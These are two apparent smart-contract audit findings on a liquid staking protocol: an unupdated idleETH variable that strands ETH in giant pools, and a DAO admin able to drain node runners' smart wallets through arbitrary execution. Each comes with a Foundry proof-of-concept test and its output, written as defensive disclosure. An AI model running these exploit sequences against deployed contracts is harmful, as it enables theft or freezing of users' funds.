# Title 1: `BringUnusedETHBackIntoGiantPool` can cause stuck ether funds in Giant Pool

## Severity

High

## Impact

`withdrawUnusedETHToGiantPool` will withdraw any eth from the vault if staking has not commenced(knot status is `INITIALS_REGISTERED`), the eth will be drawn successful to the giant pool. However, idleETH variable is not updated. idleETH  is the available ETH for withdrawing and depositing eth for staking. Since there is no other places that updates idleETH other than depositing eth for staking and withdrawing eth, the eth withdrawn from the vault will be stuck forever.

## Proof of Concept

Place poc in `GiantPools.t.sol` with `import { MockStakingFundsVault } from "../../contracts/testing/liquid-staking/MockStakingFundsVault.sol"`;

```solidity
    function testStuckFundsInGiantMEV() public {
        stakingFundsVault = MockStakingFundsVault(payable(manager.stakingFundsVault()));
        address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);
        //address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);
        //address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);
        address victim = accountFour; vm.deal(victim, 1 ether);
        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);
        emit log_address(address(giantFeesAndMevPool));
        vm.startPrank(victim);
        emit log_uint(victim.balance);
        giantFeesAndMevPool.depositETH{value: 1 ether}(1 ether);
        bytes[][] memory blsKeysForVaults = new bytes[][](1);
        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);
        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);
        stakeAmountsForVaults[0] = getUint256ArrayFromValues(1 ether);
        giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);
        emit log_uint(victim.balance);
        vm.warp(block.timestamp + 60 minutes);
        LPToken lp = (stakingFundsVault.lpTokenForKnot(blsKeysForVaults[0][0]));
        LPToken [][] memory lpToken = new LPToken[][](1);
        LPToken[] memory temp  = new LPToken[](1);
        temp[0] = lp;
        lpToken[0] = temp;
        emit log_uint(address(giantFeesAndMevPool).balance);
        giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(stakingFundsVault)),lpToken, stakeAmountsForVaults);
        emit log_uint(address(giantFeesAndMevPool).balance);
        vm.expectRevert();
        giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);
        vm.expectRevert();
        giantSavETHPool.withdrawETH(1 ether);
        vm.stopPrank();
    }
```
Both withdrawing eth for user and depositing eth to stake fails and reverts as shown in the poc due to underflow in idleETH.

Note that the same problem also exists in `GiantSavETHVaultPool`, however a poc cannot be done for it as another bug exist in `GiantSavETHVaultPool` which prevents it from receiving funds as it lacks a `receive()` or `fallback()` implementation.

## Tools Used

Foundry

## Recommended Mitigation Steps

Update idleETH in withdrawUnusedETHToGiantPool

# Title 2: DAO admin in `LiquidStakingManager.sol` can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.

## Severity

Medium

## Impact

DAO admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund via arbitrary execution.

## Proof of Concept

After the `LiquidStakingManager.sol` is deployed via `LSDNFactory::deployNewLiquidStakingDerivativeNetwork`,

```solidity
/// @notice Deploys a new LSDN and the liquid staking manger required to manage the network
/// @param _dao Address of the entity that will govern the liquid staking network
/// @param _stakehouseTicker Liquid staking derivative network ticker (between 3-5 chars)
function deployNewLiquidStakingDerivativeNetwork(
	address _dao,
	uint256 _optionalCommission,
	bool _deployOptionalHouseGatekeeper,
	string calldata _stakehouseTicker
) public returns (address) {
```
The DAO address governance address (contract) has very high privilege.

The DAO address can perform arbitrary execution by calling `LiquidStakingManager.sol::executeAsSmartWallet`.

```solidity
/// @notice Enable operations proxied through DAO contract to another contract
/// @param _nodeRunner Address of the node runner that created the wallet
/// @param _to Address of the target contract
/// @param _data Encoded data of the function call
/// @param _value Total value attached to the transaction
function executeAsSmartWallet(
	address _nodeRunner,
	address _to,
	bytes calldata _data,
	uint256 _value
) external payable onlyDAO {
	address smartWallet = smartWalletOfNodeRunner[_nodeRunner];
	require(smartWallet != address(0), "No wallet found");
	IOwnableSmartWallet(smartWallet).execute(
		_to,
		_data,
		_value
	);
}
```
The smart wallet created in the smart contract custody the 4 ETH.
```solidity
// create new wallet owned by liquid staking manager
smartWallet = smartWalletFactory.createWallet(address(this));
emit SmartWalletCreated(smartWallet, msg.sender);
```
```solidity
{
	// transfer ETH to smart wallet
	(bool result,) = smartWallet.call{value: msg.value}("");
	require(result, "Transfer failed");
	emit WalletCredited(smartWallet, msg.value);
}
```
But  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.

As shown in POC:

first we add this smart contract in `LiquidStakingManager.t.sol`.
```solidity
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
contract RugContract {
    function receiveFund() external payable {
    }
    receive() external payable {}
}
contract MockToken is ERC20 {
    constructor()ERC20("A", "B") {
        _mint(msg.sender, 10000 ether);
    }
}
```
We add the two POC, the first POC shows the admin can steal the ETH from the smart contract via arbrary execution.
```solidity
    function testDaoRugFund_Pull_ETH_POC() public {
        
        address user = vm.addr(21312);
        bytes[] memory publicKeys = new bytes[](1);
        publicKeys[0] = "publicKeys";
        bytes[] memory signature = new bytes[](1);
        signature[0] = "signature";
        RugContract rug = new RugContract();
        // user spends 4 ehter and register the key to become the public operator
        vm.prank(user);
        vm.deal(user, 4 ether);
        manager.registerBLSPublicKeys{value: 4 ether}(
            publicKeys,
            signature,
            user
        );
        address wallet = manager.smartWalletOfNodeRunner(user);
        console.log("wallet ETH balance for user after registering");
        console.log(wallet.balance);
        // dao admin rug the user by withdraw the ETH via arbitrary execution.
        vm.prank(admin);
        bytes memory data = abi.encodeWithSelector(RugContract.receiveFund.selector, "");
        manager.executeAsSmartWallet(
            user,
            address(rug),
            data,
            4 ether
        );
        console.log("wallet ETH balance for user after DAO admin rugging");
        console.log(wallet.balance);
    }
```
We run the test:
```
forge test -vv --match testDaoRugFund_Pull_ETH_POC
```
the result is:
```
Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests
[PASS] testDaoRugFund_Pull_ETH_POC() (gas: 353826)
Logs:
  wallet ETH balance for user after registering
  4000000000000000000
  wallet ETH balance for user after DAO admin rugging
  0
Test result: ok. 1 passed; 0 failed; finished in 13.63ms
```
The second POC shows the admin can steal the ERC20 token from the smart contract via arbrary execution.
```solidity
    function testDaoRugFund_Pull_ERC20_Token_POC() public {
        address user = vm.addr(21312);
        bytes[] memory publicKeys = new bytes[](1);
        publicKeys[0] = "publicKeys";
        bytes[] memory signature = new bytes[](1);
        signature[0] = "signature";
        RugContract rug = new RugContract();
        vm.prank(user);
        vm.deal(user, 4 ether);
        manager.registerBLSPublicKeys{value: 4 ether}(
            publicKeys,
            signature,
            user
        );
        address wallet = manager.smartWalletOfNodeRunner(user);
        ERC20 token = new MockToken();
        token.transfer(wallet, 100 ether);
        console.log("wallet ERC20 token balance for user after registering");
        console.log(token.balanceOf(wallet));
        vm.prank(admin);
        bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, address(rug), 100 ether);
        manager.executeAsSmartWallet(
            user,
            address(token),
            data,
            0
        );
        console.log("wallet ERC20 token balance for dao rugging");
        console.log(token.balanceOf(wallet));
    }
```
We run the test:
```
forge test -vv --match testDaoRugFund_Pull_ERC20_Token_POC
```
The running result is
```
Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests
[PASS] testDaoRugFund_Pull_ERC20_Token_POC() (gas: 940775)
Logs:
  wallet ERC20 token balance for user after registering
  100000000000000000000
  wallet ERC20 token balance for dao rugging
  0
Test result: ok. 1 passed; 0 failed; finished in 16.99ms
```

## Tools Used

Manual Review, Foundry

## Recommended Mitigation Steps

We recommend not give the dao admin the priviledge to perform arbitrary execution to access user’s fund.
